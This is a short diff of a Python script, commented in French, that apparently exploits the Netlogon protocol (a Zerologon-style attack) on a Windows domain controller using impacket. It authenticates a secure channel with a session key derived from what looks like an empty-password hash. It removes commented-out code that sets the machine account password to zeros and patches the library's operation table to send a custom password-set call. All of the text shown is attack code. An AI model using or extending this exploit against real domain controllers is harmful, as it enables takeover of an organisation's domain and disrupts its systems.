@@ -48,27 +48,9 @@ def connexion_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name, dc
 
   try:
     server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_primary_name + '\x00', dc_account_name+'\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, dc_computer_name + '\x00', client_credential, negotiate_flags)
-
-    #Ajout
     sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))
 
     try:
-      #requete = nrpc.NetrServerPasswordSet2()
-      #requete['PrimaryName'] = dc_primary_name + '\x00'
-      #requete['AccountName'] = dc_account_name + '\x00'
-      #requete['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
-      #requete['ComputerName'] = dc_computer_name + '\x00'
-
-      #authenticateur = nrpc.NETLOGON_AUTHENTICATOR()
-      #authenticateur['Credential'] = client_credential
-      #authenticateur['Timestamp'] = b"\x00" * 4
-
-      #requete["Authenticator"] = authenticateur
-      #requete["ClearNewPassword"] = b"\x00"*516
-
-      #rpc_con.request(requete)
-
-      #Ajout
       nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
       nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)
       
